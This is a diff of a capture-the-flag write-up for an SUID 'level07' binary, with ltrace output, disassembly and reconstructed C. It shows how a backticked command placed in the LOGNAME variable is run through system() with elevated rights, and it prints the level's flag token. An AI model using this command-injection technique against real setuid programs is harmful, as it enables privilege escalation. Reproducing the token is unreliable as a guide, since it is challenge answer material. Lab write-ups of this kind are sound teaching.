@@ -1,11 +1,35 @@
 # Level07
+## substitution commands linux
+Command substitution allows the output of a command to replace the command itself. Command substitution occurs when a command is enclosed as follows: $(command) or \`command\`
+Example:
+```bash
+echo `pwd`
+/home/user/level07
+```
+
 ```bash
 ls -la
-
+-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07 # with suid, sgid permissions
 ```
+We can debug this binary file using one of those: gdb, objdump or ltrace,
+```bash
 ltrace ./level07
+__libc_start_main(0x8048514, 1, 0xbffff7a4, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                                             = 2007
+geteuid()                                                             = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                   = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                   = 0
+getenv("LOGNAME")                                                     = "level07"
+asprintf(0xbffff6f4, 0x8048688, 0xbfffff26, 0xb7e5ee55, 0xb7fed280)   = 18
+system("/bin/echo level07 "level07
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                = 0
++++ exited (status 0) +++
+```
 
 ```bash
+# Using Gfb
 Dump of assembler code for function main:
    0x08048514 <+0>:	push   ebp
    0x08048515 <+1>:	mov    ebp,esp
@@ -43,7 +67,7 @@ Dump of assembler code for function main:
    0x0804859f <+139>:	leave
    0x080485a0 <+140>:	ret
 ```
-
+Translate to this code source
 ```c
 int main() {
   gid_t gid;
@@ -60,7 +84,7 @@ int main() {
   system(buff);
 }
 ```
-
+The program read an env variable which is `LOGNAME`, which we can override to use our command
 ```bash
 LOGNAME='`getflag`'
 # output: Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
